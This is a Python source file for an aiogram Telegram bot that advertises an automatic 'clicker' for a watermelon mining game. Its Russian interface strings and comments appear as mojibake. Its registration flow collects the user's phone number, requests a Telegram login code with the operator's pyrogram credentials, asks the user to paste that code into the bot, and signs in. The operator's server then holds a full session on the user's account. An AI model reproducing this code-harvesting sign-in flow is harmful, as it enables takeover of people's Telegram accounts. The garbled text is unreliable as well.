from aiogram import F, Router, types
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, CallbackQuery
import app.key as k
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from Private import api_id, api_hash
from pyrogram import Client

router = Router()
Number = ''

sCoder = ''


# Cliert = 0


# TODO: –î–æ–ø–∏—Å–∞—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∫–ª–∏–∫–µ—Ä–∞, —Å–ª–æ–≤–∞—Ä—å, –ø—Ä–æ—Ü–µ—Å—Å –≤—Ö–æ–¥–∞,

class Reg(StatesGroup):
    number = State()
    kod = State()
    sCode = State()
    Clients = State()


@router.message(CommandStart())
async def cmd_start(message: Message):
    await message.reply(f'–ü—Ä–∏–≤–µ—Ç. \n–¢–≤–æ–π ID:{message.from_user.id} —Ç—ã –µ—Å—Ç—å –≤ –Ω–∞—à–µ–π —Å–∏—Å—Ç–µ–º–µ', reply_markup=k.main)


@router.message(Command('help'))
async def get_help(message: Message):
    await message.answer(f'/help - –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ –±–æ—Ç–∞'
                         f'\n "–ü—Ä–æ—Ñ–∏–ª—å" - –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Å–∫–æ–ª—å–∫–æ –Ω–∞–º–∞–π–Ω–∏–ª –∫–ª–∏–∫–µ—Ä'
                         f'\n /start - –∑–∞–ø—É—Å–∫–∞–µ—Ç –±–æ—Ç–∞'
                         f'\n "–ó–∞–ø—É—Å—Ç–∏—Ç—å –∫–ª–∏–∫–µ—Ä –Ω–∞ –∞—Ä–±—É–∑—ãüçâ" - –ó–∞–ø—É—Å–∫–∞–µ—Ç –∫–ª–∏–∫–µ—Ä  ')


@router.message(F.text == 'üÜò–ü–æ–º–æ—â—å')
async def get_prof(message: Message):
    await message.answer('–ú–æ–∂–µ—Ç–µ –∑–∞–¥–∞—Ç—å –≤–æ–ø—Ä–æ—Å –∞–¥–º–∏–Ω—É –∏–ª–∏ —Å–æ–æ–±—â–∏—Ç—å –µ–º—É –æ–± –æ—à–∏–±–∫–µ - ....')


@router.message(F.text == 'üë§–ü—Ä–æ—Ñ–∏–ª—å')
async def get_prof(message: Message):
    await message.answer('–ò–Ω—Ñ')


@router.message(F.text == 'üçâ–ó–∞–ø—É—Å—Ç–∏—Ç—å –∫–ª–∏–∫–µ—Ä –Ω–∞ –∞—Ä–±—É–∑—ã')
async def get_prof(message: Message):
    await message.reply('‚úÖ–ö–ª–∏–∫–µ—Ä –≤–∫–ª—é—á–µ–Ω', reply_markup=k.OFF)


@router.callback_query(F.data == 'OFF')
async def back(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text('–ö–ª–∏–∫–µ—Ä –≤—ã–∫–ª—é—á–µ–Ω', reply_markup=k.ON)


@router.callback_query(F.data == 'ON')
async def back(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text('–ö–ª–∏–∫–µ—Ä –≤–∫–ª—é—á–µ–Ω', reply_markup=k.OFF)


@router.message(F.text == '–ü—Ä–æ—Ñ–∏–ª—å')
async def get_prof(message: Message):
    await message.answer('–ò–Ω—Ñ')


@router.message(Command('reg'))
async def reg(message: Message, state: FSMContext):
    await state.set_state(Reg.number)
    await message.reply('–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞', reply_markup=k.contact_btn)


# –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–ª —Å–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞
@router.message(F.contact)
async def save_phone_number(message: Message, state: FSMContext):
    if message.contact.user_id == message.from_user.id:
        await state.update_data(number=message.contact.phone_number)
        client = Client(str(message.from_user.id), api_id, api_hash)
        await client.connect()
        sCode = await client.send_code(message.contact.phone_number)
        await state.update_data(sCode=sCode)
        await state.update_data(Clients=client)
        await message.answer('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥')
        await state.set_state(Reg.kod)


@router.message(Reg.number)
async def reg_number(message: Message, state: FSMContext):
    await state.update_data(number=message.text)


@router.message(Reg.kod)
async def reg_kod(message: Message, state: FSMContext):
    data = await state.get_data()
    await data["Clients"].sign_in(str(data["number"]), data["sCode"].phone_code_hash, message.text)
    await message.answer("–°–ø–∞—Å–∏–±–æ")
    await state.clear()
